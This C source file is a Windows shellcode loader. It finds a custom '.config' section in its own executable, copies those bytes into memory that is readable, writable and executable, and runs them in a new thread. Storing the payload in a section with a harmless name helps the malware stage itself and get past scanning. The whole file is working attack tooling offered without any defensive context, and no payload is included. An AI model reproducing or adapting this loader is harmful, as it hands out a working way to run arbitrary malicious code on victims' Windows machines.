#include <Windows.h>
#include <stdio.h>

#define C_PTR( x ) ( PVOID ) x
#define U_PTR( x ) ( ULONG_PTR ) x

BOOL GetCurrentSection(
    _In_      LPSTR  SecName,
    _Out_opt_ PVOID* SecData,
    _Out_opt_ PULONG SecSize
) {
	PVOID				  Image    = { 0 };
    PIMAGE_NT_HEADERS	  NtHeader = { 0 };
    PIMAGE_SECTION_HEADER ScHeader = { 0 };

	//
	// get current process image 
	// 
	Image = GetModuleHandleA( NULL );
	
    //
	// retrieve nt image header 
	//
	NtHeader = ( U_PTR( Image ) + ( ( PIMAGE_DOS_HEADER ) Image )->e_lfanew );
	if ( NtHeader->Signature != IMAGE_NT_SIGNATURE ) {
		puts( "[-] Invalid pe header" );
		return FALSE;
	}

	//
	// iterate over all the sections 
	//
	ScHeader = IMAGE_FIRST_SECTION( NtHeader );
	for ( int i = 0; i < NtHeader->FileHeader.NumberOfSections; i++ ) {
		if ( ! ScHeader[ i ].VirtualAddress ) {
		    continue;
		}

		if ( strcmp( SecName, ScHeader[ i ].Name ) == 0 ) {
			if ( SecData ) {
			    *SecData = U_PTR( Image ) + ScHeader[ i ].VirtualAddress;
			}

			if ( SecSize ) {
			    *SecSize = ScHeader[ i ].SizeOfRawData;
			}

		    return TRUE;
		}
	}

	return FALSE;
}

int main( void )
{
	PVOID  Shellcode	 = { 0 };
	HANDLE Thread		 = { 0 };
	PVOID  SectionData   = { 0 };
	ULONG  SectionSize   = { 0 };
	CHAR   SectionName[] = ".config";

    if ( ! GetCurrentSection( SectionName, &SectionData, &SectionSize ) ) {
        printf( "[!] Config section \"%s\" not found", SectionName );
		return -1; 
    }

	printf( "[*] Config section found @ %p [%d bytes]\n", SectionData, SectionSize );

	if ( ! ( Shellcode = VirtualAlloc( NULL, SectionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE ) ) ) {
	    printf( "[!] VirtualAlloc Failed: %d\n", GetLastError() );
		goto END;
	}
	printf( "[*] Allocate memory for shellcode @ %p\n", Shellcode );

	memcpy( Shellcode, SectionData, SectionSize );

	if ( ! ( Thread = CreateThread( NULL, 0, Shellcode, NULL, 0, NULL ) ) ) {
		printf( "[!] CreateThread Failed: %d\n", GetLastError() );
	    goto END;
	}

	WaitForSingleObject( Thread, INFINITE );

END:
	if ( Thread ) {
	    CloseHandle( Thread );
	    Thread = NULL;    
	}

	if ( Shellcode ) {
	    VirtualFree( Shellcode, 0, MEM_FREE );
		Shellcode = NULL;
	}
	
	return 0;
}